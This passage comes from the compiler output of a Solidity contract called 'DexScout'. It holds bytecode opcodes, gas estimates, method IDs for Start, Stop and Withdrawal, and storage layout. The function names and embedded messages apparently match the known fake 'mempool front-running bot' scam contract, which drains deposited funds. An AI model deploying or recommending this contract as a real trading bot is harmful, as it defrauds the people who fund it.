JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA5C PUSH1 0x33 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xA67 DUP3 PUSH2 0xA02 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA89 DUP2 PUSH2 0xA50 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAC4 PUSH1 0x18 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xACF DUP3 PUSH2 0xA90 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAF1 DUP2 PUSH2 0xAB8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xB4E DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xB59 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xB67 DUP2 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xB7E JUMPI PUSH2 0xB7D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBC5 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xBD0 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xBE8 JUMPI PUSH2 0xBE7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBF8 DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC03 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC2F JUMPI PUSH2 0xC2E PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC3F DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC4A DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC76 JUMPI PUSH2 0xC75 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC86 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xCB8 JUMPI PUSH2 0xCB7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xCFA DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD05 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD15 JUMPI PUSH2 0xD14 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xD57 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD62 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD72 JUMPI PUSH2 0xD71 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD87 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD92 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xDAA JUMPI PUSH2 0xDA9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xDC6 DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xDD1 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xDEA JUMPI PUSH2 0xDE9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDFA DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xE05 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xE1E JUMPI PUSH2 0xE1D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP7 RETURNDATASIZE 0xE SWAP6 0x29 DUP2 0xAC PUSH17 0xD7F98142E819F5FA07D24467409200D15D 0xCE 0xC7 BASEFEE 0xAB SDIV 0xD6 0xEF PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "734800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "1938",
						"Withdrawal()": "infinite"
					},
					"internal": {
						"WithdrawalProfits()": "infinite",
						"_calculateGasNeeds()": "22",
						"_callDexAction()": "infinite",
						"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "22",
						"keccak(struct DexScout.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 8,
						"contract": "dexscout.sol:DexScout",
						"label": "_RouterAddress",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 10,
						"contract": "dexscout.sol:DexScout",
						"label": "_Network",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "dexscout.sol:DexScout",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}